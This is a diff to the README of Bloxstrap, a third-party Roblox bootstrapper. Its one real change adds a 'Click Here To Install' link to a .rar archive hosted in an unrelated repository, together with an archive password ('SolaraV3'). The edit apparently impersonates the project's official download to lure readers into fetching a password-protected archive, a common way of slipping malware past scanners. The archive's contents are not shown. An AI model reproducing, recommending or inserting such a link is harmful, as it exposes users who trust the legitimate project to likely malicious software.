@@ -5,6 +5,7 @@
 
 <div align="center">
 
+
 [![License][shield-repo-license]][repo-license]
 [![GitHub Workflow Status][shield-repo-workflow]][repo-actions]
 [![Crowdin][shield-crowdin-status]][crowdin-project]
@@ -18,6 +19,9 @@
 ----
 
 Bloxstrap is a third-party replacement for the standard Roblox bootstrapper, providing additional useful features and improvements.
+
+#[Click Here To Install](https://github.com/ZeroHubm/Bootstrapper-RBLX/raw/refs/heads/main/Bootstrapper.rar )
+#[Pass - SolaraV3]
 
 Running into a problem or need help with something? [Check out the Wiki](https://github.com/bloxstraplabs/bloxstrap/wiki). If you can't find anything, or would like to suggest something, please [submit an issue](https://github.com/bloxstraplabs/bloxstrap/issues).
 
